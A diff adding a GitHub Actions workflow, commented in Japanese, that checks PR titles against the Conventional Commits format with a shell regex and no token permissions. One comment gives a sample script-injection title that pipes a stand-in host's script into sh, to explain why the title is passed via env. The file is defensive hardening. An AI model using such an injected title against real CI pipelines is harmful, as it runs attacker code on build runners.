@@ -1,0 +1,58 @@
+# =============================================================================
+# PR タイトルの Conventional Commits 検査
+# -----------------------------------------------------------------------------
+# 目的:
+#   main の履歴を Conventional Commits（feat: / fix: / docs: ...）で統一する。
+# なぜ「コミット」ではなく「PR タイトル」を検査するのか:
+#   このリポジトリは squash マージのみを許可し、squash 時のコミットメッセージに PR タイトルを使う
+#   （Settings > General > Pull Requests で設定。docs/github-setup.md 参照）。
+#   つまり main に残るのは PR タイトルだけなので、作業途中の細かいコミットを縛る必要はなく、
+#   タイトル 1 か所を検査すれば履歴全体が揃う。開発者の負担も最小で済む。
+# 効果:
+#   - リリースノートや CHANGELOG を履歴から自動生成できる
+#   - 「feat!:」のような破壊的変更が履歴から一目で分かる
+# なぜサードパーティ action を使わずシェルで書くのか:
+#   正規表現 1 つで済む処理のために外部コードへ依存すると、サプライチェーンの攻撃面が増えるため。
+# 実行主体: GitHub Actions（ランナー上でシェルを実行）。Copilot は関与しない。
+# =============================================================================
+name: PR Title
+
+on:
+  pull_request:
+    # edited: タイトルを修正しただけで再検査されるようにする（コードの push 不要）。
+    types: [opened, edited, synchronize, reopened]
+
+# トークンは一切使わないので、権限はすべて無効化する。
+permissions: {}
+
+concurrency:
+  group: ${{ github.workflow }}-${{ github.event.pull_request.number }}
+  cancel-in-progress: true
+
+jobs:
+  pr-title:
+    name: pr-title
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    permissions: {}
+    steps:
+      # PR タイトルは外部（fork の作者など）が自由に書ける「信頼できない入力」。
+      # run の中に ${{ github.event.pull_request.title }} を直接書くと、
+      # タイトルに `"; curl evil.sh | sh; "` のような文字列を入れるだけで任意コマンドを実行できてしまう
+      # （スクリプトインジェクション）。必ず env 経由で渡し、シェル変数として扱う。
+      - name: Check Conventional Commits format
+        env:
+          PR_TITLE: ${{ github.event.pull_request.title }}
+        run: |
+          # 形式: <type>(<scope>)!: <description>
+          #   type  : 下記のいずれか（プロジェクトに合わせて増減してよい）
+          #   scope : 任意。例 feat(api): / fix(web):
+          #   !     : 任意。破壊的変更を示す
+          pattern='^(feat|fix|docs|style|refactor|perf|test|build|ci|chore|revert)(\([^)]+\))?!?: .+'
+          if [[ "$PR_TITLE" =~ $pattern ]]; then
+            echo "PR title follows Conventional Commits."
+          else
+            # タイトル本文はログに出さない（ワークフローコマンド `::...::` の注入を避けるため）。
+            echo "::error title=Invalid PR title::PR タイトルを Conventional Commits 形式にしてください（例: 'feat(api): 進捗APIを追加' / 'fix: 採点の境界値を修正'）。"
+            exit 1
+          fi
